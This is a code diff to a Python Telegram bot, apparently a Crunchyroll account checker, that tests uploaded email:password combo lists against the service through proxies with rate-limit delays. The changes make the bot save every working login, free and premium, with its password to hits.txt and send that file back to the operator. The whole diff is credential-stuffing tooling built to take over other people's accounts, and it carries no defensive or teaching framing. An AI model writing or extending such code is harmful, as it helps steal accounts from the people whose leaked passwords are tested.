@@ -171,8 +171,10 @@ class CrunchyrollChecker:
 
 
 async def send_result(chat_id, result):
-    if result['status'] == 'PREMIUM':
-        capture = f"""
+    if result['status'] not in ['PREMIUM', 'FREE']:
+        return  # silent for invalid
+
+    capture = f"""
 {'='*70}
 EMAIL: {result['email']}
 PASSWORD: {result['password']}
@@ -190,13 +192,9 @@ COUNTRY: {result.get('country', 'N/A')}
 CHECKED BY: @Sudhakaran12
 {'='*70}
 """
-        await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-        with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write(capture + "\n")
-    elif result['status'] == 'FREE':
-        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
-    else:
-        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
+
+    with open("hits.txt", "a", encoding="utf-8") as f:
+        f.write(capture + "\n")
 
 
 @dp.message(Command("start"))
@@ -268,7 +266,7 @@ async def handle(message: types.Message):
     if not lines:
         return await message.answer("No valid email:password found.")
 
-    # Reset checker for every new file (fixes second-file invalid issue)
+    # Reset checker for every new file
     checker = CrunchyrollChecker(proxies)
 
     await message.answer(f"🚀 Checking {len(lines)} combos... (delay: {RATE_DELAY}s)")
@@ -288,10 +286,16 @@ async def handle(message: types.Message):
 
             await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(RATE_DELAY)   # ← Rate limiting control
+            await asyncio.sleep(RATE_DELAY)
 
         except:
             continue
+
+    # After all checks, send the hits.txt file
+    if os.path.exists("hits.txt") and os.path.getsize("hits.txt") > 0:
+        await message.answer_document(types.InputFile("hits.txt"), caption="✅ Here are all FREE + PREMIUM hits")
+    else:
+        await message.answer("No hits found.")
 
 
 async def main():
@@ -303,4 +307,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-                
